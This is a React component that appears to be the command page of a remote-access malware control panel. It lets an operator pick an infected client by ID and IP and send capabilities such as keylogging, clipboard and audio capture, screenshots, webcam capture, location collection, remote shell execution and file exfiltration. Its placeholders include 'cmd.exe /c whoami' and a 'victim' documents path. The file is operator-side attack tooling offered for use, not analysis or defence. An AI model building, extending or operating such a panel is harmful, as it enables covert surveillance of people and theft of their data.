import React, { useState, useEffect } from 'react';
import { api } from '../api';

// Enhanced capability metadata
const CAPABILITY_METADATA = {
  1: { needsArgs: false, hint: 'Records audio from the client' },
  2: { needsArgs: false, hint: 'Captures clipboard content' },
  3: { needsArgs: false, hint: 'Logs keystrokes' },
  4: { needsArgs: false, hint: 'Takes a screenshot' },
  5: { needsArgs: false, hint: 'Collects system information' },
  6: { needsArgs: true, hint: 'Executes a shell command', placeholder: 'cmd.exe /c whoami' },
  7: { needsArgs: false, hint: 'Collects location data' },
  8: { needsArgs: true, hint: 'Exfiltrates a single file', placeholder: 'C:\\Users\\victim\\Documents\\secret.pdf' },
  9: { needsArgs: true, hint: 'Exfiltrates files by extension from directory', placeholder: '.pdf,.docx,.txt or C:\\path|.pdf,.docx' },
  10: { needsArgs: false, hint: 'Captures image from camera' }
};

function Commands() {
  const [clients, setClients] = useState([]);
  const [selectedClient, setSelectedClient] = useState('');
  const [selectedCapability, setSelectedCapability] = useState('5');
  const [args, setArgs] = useState('');
  const [message, setMessage] = useState(null);
  const [sending, setSending] = useState(false);
  const [capabilities, setCapabilities] = useState({});
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchClients();
    fetchCapabilities();
  }, []);

  const fetchCapabilities = async () => {
    try {
      const caps = await api.getCapabilities();
      setCapabilities(caps);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching capabilities:', error);
      setLoading(false);
    }
  };

  const fetchClients = async () => {
    try {
      const data = await api.getClients();
      setClients(Object.values(data.clients || {}));
    } catch (error) {
      console.error('Error fetching clients:', error);
    }
  };

  const handleSend = async (e) => {
    e.preventDefault();
    
    if (!selectedClient) {
      setMessage({ type: 'error', text: 'Please select a client' });
      return;
    }

    const capabilityMeta = CAPABILITY_METADATA[selectedCapability];
    if (capabilityMeta && capabilityMeta.needsArgs && !args.trim()) {
      setMessage({ type: 'error', text: 'This capability requires arguments' });
      return;
    }

    setSending(true);
    setMessage(null);

    try {
      await api.sendCommand(selectedClient, parseInt(selectedCapability), args);
      const capabilityName = capabilities[selectedCapability] || `Capability ${selectedCapability}`;
      setMessage({ 
        type: 'success', 
        text: `✓ Command sent: ${capabilityName}` 
      });
      setArgs('');
      setTimeout(() => setMessage(null), 5000);
    } catch (error) {
      setMessage({ 
        type: 'error', 
        text: `Failed: ${error.response?.data?.message || error.message}` 
      });
    } finally {
      setSending(false);
    }
  };

  const capabilityMeta = CAPABILITY_METADATA[selectedCapability] || { needsArgs: false, hint: '' };

  if (loading) {
    return <div className="loading">Loading capabilities...</div>;
  }

  return (
    <div>
      <div className="card">
        <h2>Send Command</h2>
        
        {message && (
          <div className={`alert ${message.type}`}>
            {message.text}
          </div>
        )}

        <form onSubmit={handleSend}>
          <div className="form-group">
            <label>Select Client</label>
            <select
              value={selectedClient}
              onChange={(e) => setSelectedClient(e.target.value)}
              required
            >
              <option value="">-- Choose a client --</option>
              {clients.map((client) => (
                <option key={client.id} value={client.id}>
                  {client.id} - {client.ip}
                </option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label>Select Capability</label>
            <select
              value={selectedCapability}
              onChange={(e) => setSelectedCapability(e.target.value)}
              required
            >
              {Object.entries(capabilities)
                .filter(([id]) => id !== '0')
                .sort((a, b) => parseInt(a[0]) - parseInt(b[0]))
                .map(([id, name]) => (
                  <option key={id} value={id}>
                    {id}. {name}
                  </option>
                ))}
            </select>
            <small>{capabilityMeta.hint}</small>
          </div>

          {capabilityMeta.needsArgs && (
            <div className="form-group">
              <label>Command Arguments</label>
              <input
                type="text"
                value={args}
                onChange={(e) => setArgs(e.target.value)}
                placeholder={capabilityMeta.placeholder || 'Enter arguments'}
                required
              />
            </div>
          )}

          <button type="submit" className="btn" disabled={sending}>
            {sending ? 'Sending...' : 'Send Command'}
          </button>
        </form>
      </div>

      <div className="card">
        <h2>Available Capabilities</h2>
        <div className="info-block">
          {Object.entries(capabilities)
            .filter(([id]) => id !== '0')
            .sort((a, b) => parseInt(a[0]) - parseInt(b[0]))
            .map(([id, name]) => {
              const meta = CAPABILITY_METADATA[id] || {};
              return (
                <div key={id}>
                  <strong>{id}.</strong> {name} {meta.hint && `- ${meta.hint}`}
                </div>
              );
            })}
        </div>
      </div>
    </div>
  );
}

export default Commands;
